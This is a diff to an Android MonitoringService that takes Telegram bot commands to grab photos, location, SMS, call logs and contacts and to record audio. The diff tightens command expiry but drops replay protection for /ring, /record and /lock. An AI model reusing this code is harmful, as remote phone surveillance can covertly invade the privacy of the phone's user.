@@ -114,7 +114,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
-        private val NO_REPLAY_COMMANDS = setOf("/smsconfirm", "/ring", "/record", "/lock")
+        private val NO_REPLAY_COMMANDS = setOf("/smsconfirm")
         private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
@@ -556,7 +556,18 @@ class MonitoringService : Service() {
         try {
             val now = android.os.SystemClock.elapsedRealtime()
             if (now - pairHintAt.get() < 3_600_000L) return
+            val nowWall = System.currentTimeMillis()
+            try {
+                val meta = getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE)
+                val lastWall = meta.getLong("last_pair_hint_wall", 0L)
+                if (lastWall != 0L && nowWall >= lastWall && nowWall - lastWall < 3_600_000L) return
+            } catch (_: Exception) {
+            }
             pairHintAt.set(now)
+            try {
+                getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE).edit().putLong("last_pair_hint_wall", nowWall).apply()
+            } catch (_: Exception) {
+            }
             val token = try {
                 preferencesManager.botToken
             } catch (_: Exception) {
@@ -908,7 +919,7 @@ class MonitoringService : Service() {
         val pressedAt = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
         if (pressedAt > 0L) {
             val menuAge = System.currentTimeMillis() / 1000L - pressedAt
-            val menuMaxAge = if (command in MUTATING_COMMANDS) 300L else 900L
+            val menuMaxAge = if (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) 300L else 900L
             if (menuAge > menuMaxAge) {
                 sendToTelegram("\u231B Menu expired, here is a fresh one.", mainMenu())
                 return
@@ -1084,7 +1095,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false, senderId: String = "") {
-        if (sentAtSec > 0 && command in MUTATING_COMMANDS) {
+        if (sentAtSec > 0 && (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS)) {
             val ageSec = System.currentTimeMillis() / 1000L - sentAtSec
             if (ageSec > 300L) {
                 sendToTelegram("\u23F3\uFE0F Command $command expired, send again.")
